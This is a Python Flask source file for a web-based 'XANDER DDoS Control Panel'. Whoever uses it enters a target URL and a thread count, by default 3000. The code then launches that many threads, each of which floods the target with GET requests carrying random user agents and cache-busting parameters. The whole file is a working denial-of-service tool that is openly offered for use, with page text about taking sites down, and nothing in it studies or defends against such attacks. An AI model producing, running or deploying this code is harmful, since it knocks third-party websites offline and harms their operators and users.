from flask import Flask, request, render_template_string
import threading
import requests
import random
import os
import sys
from fake_useragent import UserAgent

app = Flask(__name__)
ua = UserAgent()

attack_threads = []
stop_attack = False

print("🚀 XANDER DDoS Panel starting in Codespaces...")

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>XANDER DDoS v18</title>
    <style>
        body { background:#000; color:#0f0; font-family:monospace; text-align:center; padding:60px; }
        input, button { padding:15px; margin:10px; font-size:18px; background:#111; color:#0f0; border:2px solid #0f0; width:480px; }
        button:hover { background:#0f0; color:#000; cursor:pointer; }
        #status { color:#ff0; font-size:24px; margin:30px; }
    </style>
</head>
<body>
    <h1>🔥 XANDER DDoS CONTROL PANEL v18</h1>
    <form method="POST">
        <input type="text" name="target" placeholder="https://target-to-take-down.com" required><br>
        <input type="number" name="threads" value="3000" placeholder="Threads"><br>
        <button type="submit" name="action" value="start">LAUNCH MASSIVE ATTACK</button>
        <button type="submit" name="action" value="stop">STOP ALL ATTACKS</button>
    </form>
    <div id="status">Status: Ready</div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def panel():
    global stop_attack, attack_threads
    if request.method == "POST":
        action = request.form.get("action")
        if action == "start":
            target = request.form.get("target").strip()
            threads = int(request.form.get("threads", 3000))
            stop_attack = False

            def flood():
                while not stop_attack:
                    try:
                        requests.get(target, headers={"User-Agent": ua.random}, params={"b": random.randint(1,999999999)}, timeout=5)
                    except:
                        pass

            attack_threads.clear()
            for _ in range(threads):
                t = threading.Thread(target=flood, daemon=True)
                t.start()
                attack_threads.append(t)

            msg = f"🚨 ATTACKING {target} with {threads} threads - Site is getting wrecked..."
            print(msg)
            return render_template_string(HTML.replace("Status: Ready", msg))

        elif action == "stop":
            stop_attack = True
            attack_threads.clear()
            print("🛑 All attacks stopped")
            return render_template_string(HTML.replace("Status: Ready", "🛑 All attacks stopped"))

    return render_template_string(HTML)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"✅ Panel live on port {port}")
    app.run(host="0.0.0.0", port=port, threaded=True)
